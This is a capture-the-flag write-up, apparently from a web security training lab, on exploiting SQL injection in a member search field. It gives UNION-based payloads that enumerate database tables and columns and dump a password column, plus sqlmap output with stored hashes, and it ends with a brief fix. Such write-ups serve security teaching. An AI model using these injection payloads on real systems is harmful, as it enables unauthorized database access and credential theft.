# Sql Injection Members
- In the page /?page=member there is a field to search members by their ids.
- That input gives us an SQL statement error "Unknown column 'Foo' in 'where clause'" in case of invalid input ie: Foo.

# Vulnerability
- We could imagine the SQL statement in back end is as follows:
```sql 
    SELECT * FROM users WHERE id = $_GET['id']
```
- We can enter some malicius input like this: 42 OR 1=1 this statment is always true so it will return ALL rows from the "users" table.

# Method 1: 

- We Can Use SQL Injection to find all tables of a database:
``` sql
1 UNION SELECT table_name, table_schema FROM information_schema.tables
```
- We Can Notice Something Like This:
    First name: users
    Surname : Member_Sql_Injection

- We can try to find all columns
``` sql
1 UNION SELECT table_name, column_name FROM information_schema.columns
```
- We Notice The Table users from the [First name: users] output has these columns:
    __user_id, first_name, last_name, town, country, planet, Commentaire, countersign__

- We Know now __users__ columns, we can select __Commentaire, countersign__:
``` sql
1 UNION SELECT  Commentaire, countersign FROM Member_Sql_Injection.users
```

- Notice this:
    ID: 1 UNION SELECT  Commentaire, countersign FROM Member_Sql_Injection.users 
    First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
    Surname : 5ff9d0165b4f92b14994e5c685cdce28
- Converting 5ff9d0165b4f92b14994e5c685cdce28 to plain text is FortyTwo.
- Converting fortytwo to sha256 is 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5 Which is Our Flag.


# Method 2: Using SqlMap
- Using 'sqlmap' to dump users data from users table returns this:
Database: Member_Sql_Injection
Table: users
[4 entries]
+---------+-----------+--------+-----------+-----------+----------------+-------------------------------------------------------------------------------+------------------------------------------------+
| user_id | town      | planet | country   | last_name | first_name     | Commentaire                                                                   | countersign                                    |
+---------+-----------+--------+-----------+-----------+----------------+-------------------------------------------------------------------------------+------------------------------------------------+
| 1       | Honolulu  | EARTH  | America   | Obama     | Barack Hussein | Amerca !                                                                      | 2b3366bcfd44f540e630d4dc2b9b06d9               |
| 2       | Berlin    | Earth  | Allemagne | Hitler    | Adolf          | Ich spreche kein Deutsch.                                                     | 60e9032c586fb422e2c16dee6286cf10 (oktoberfest) |
| 3       | Moscou    | Earth  | Russia    | Staline   | Joseph         | ????? ????????????? ?????????                                                 | e083b24a01c483437bcf4a9eea7c1b4d               |
| 5       | 42        | 42     | 42        | GetThe    | Flag           | Decrypt this password -> then lower all the char. Sh256 on it and it's good ! | 5ff9d0165b4f92b14994e5c685cdce28               |
+---------+-----------+--------+-----------+-----------+----------------+-------------------------------------------------------------------------------+------------------------------------------------+
- Notice the comment: Decrypt this password -> then lower all the char. Sh256 on it and it's good !         5ff9d0165b4f92b14994e5c685cdce28
- Converting 5ff9d0165b4f92b14994e5c685cdce28 to plain text is FortyTwo.
- Converting fortytwo to sha256 is 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5 Which is Our Flag.

# Fix
- We can prevent this by using prepared statements and parameterized queries.